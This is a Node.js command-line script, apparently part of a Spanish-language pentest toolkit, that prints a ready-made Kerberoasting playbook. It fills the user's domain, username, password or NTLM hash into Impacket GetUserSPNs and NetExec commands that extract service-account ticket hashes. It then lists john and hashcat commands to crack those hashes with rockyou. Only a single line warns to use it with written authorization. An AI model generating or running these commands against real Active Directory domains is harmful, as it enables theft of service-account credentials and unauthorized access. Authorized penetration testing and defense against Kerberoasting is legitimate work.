#!/usr/bin/env node
/**
 * MFH TOOLS - Kerberoasting
 * Categoria: Kerberoasting
 *
 * Uso: node kerberoast.js --domain <domain> --user <user> [--pass <password|hash>] [--dc <ip>]
 *
 * Autor: FalconMX Security
 */

'use strict';

const CONFIG = { version: '1.0.0', author: 'FalconMX Security' };

// ============================================================
// REPORTE
// ============================================================
function printReport(domain, user, pass, dc) {
    console.log('');
    console.log('='.repeat(65));
    console.log('  KERBEROASTING');
    console.log('  Dominio: ' + (domain || 'example.local'));
    console.log('  Usuario: ' + (user || 'username'));
    console.log('  DC IP: ' + (dc || '192.168.1.10'));
    console.log('  Fecha: ' + new Date().toISOString());
    console.log('='.repeat(65));
    console.log('');
    console.log('  [Tool] Impacket GetUserSPNs');
    console.log('    GetUserSPNs.py Conducts kerberoasting, where service principal names are queried and extracted along with their NTLM hashes [citation:12]');
    console.log('');
    console.log('  [Install]');
    console.log('    pip install impacket');
    console.log('    # o');
    console.log('    python3 -m pipx install impacket');
    console.log('');
    if (pass && pass.indexOf(':') !== -1) {
        console.log('  [Comando] Con hash (LM:NT)');
        console.log('    impacket-GetUserSPNs -hashes ' + pass + ' ' + (domain || 'example.local') + '/' + (user || 'username') + ' -dc-ip ' + (dc || '192.168.1.10') + ' -outputfile hashes.txt');
        console.log('');
        console.log('  [Ejemplo]');
        console.log('    impacket-GetUserSPNs -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 example.local/username -dc-ip 192.168.1.10 -outputfile hashes.txt');
    } else {
        console.log('  [Comando] Con password');
        console.log('    impacket-GetUserSPNs ' + (domain || 'example.local') + '/' + (user || 'username') + ':' + (pass || 'password') + ' -dc-ip ' + (dc || '192.168.1.10') + ' -outputfile hashes.txt');
        console.log('');
        console.log('  [Ejemplo]');
        console.log('    impacket-GetUserSPNs example.local/username:password -dc-ip 192.168.1.10 -outputfile hashes.txt');
    }
    console.log('');
    console.log('  [Tool] NetExec (nxc)');
    console.log('    pip install netexec');
    console.log('    netexec ldap ' + (dc || '192.168.1.10') + ' -u ' + (user || 'username') + ' -p ' + (pass || 'password') + ' --kerberoasting output.txt');
    console.log('');
    console.log('  [Cracking]');
    console.log('    john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt');
    console.log('    hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt');
    console.log('    hashcat -m 19600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt   # AES128');
    console.log('    hashcat -m 19700 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt   # AES256');
    console.log('');
    console.log('  [Notas]');
    console.log('    - Hash output: $krb5tgs$23$... (RC4) o $krb5tgs$18$... (AES256) [citation:13]');
    console.log('    - RC4 hardening en 2026: cuentas AES-only fallan con /rc4');
    console.log('    - Requiere cualquier usuario de dominio (low-priv es suficiente) [citation:13]');
    console.log('');
    console.log('-'.repeat(65));
    console.log('  WARN: solo ataca dominios con autorizacion escrita');
    console.log('-'.repeat(65));
    console.log('');
}

// ============================================================
// CLI
// ============================================================
function main() {
    var args = process.argv.slice(2);
    var domainIdx = args.indexOf('--domain');
    var userIdx = args.indexOf('--user');
    var passIdx = args.indexOf('--pass');
    var dcIdx = args.indexOf('--dc');

    if (args.length === 0) {
        console.log('');
        console.log('+------------------------------------------------------+');
        console.log('|  MFH TOOLS - Kerberoasting v' + CONFIG.version + '                    |');
        console.log('|  ' + CONFIG.author + '                              |');
        console.log('+------------------------------------------------------+');
        console.log('');
        console.log('  Uso: node kerberoast.js --domain <domain> --user <user> [--pass <password|hash>] [--dc <ip>]');
        console.log('');
        console.log('  Ejemplos:');
        console.log('    node kerberoast.js --domain example.local --user username --pass password --dc 192.168.1.10');
        console.log('    node kerberoast.js --domain example.local --user username --pass aad3b...:31d6... --dc 192.168.1.10');
        console.log('');
        process.exit(0);
    }

    var domain = domainIdx !== -1 ? args[domainIdx + 1] : 'example.local';
    var user = userIdx !== -1 ? args[userIdx + 1] : 'username';
    var pass = passIdx !== -1 ? args[passIdx + 1] : '';
    var dc = dcIdx !== -1 ? args[dcIdx + 1] : '192.168.1.10';

    console.log('\nGenerando comandos Kerberoasting...\n');
    printReport(domain, user, pass, dc);
}

main();
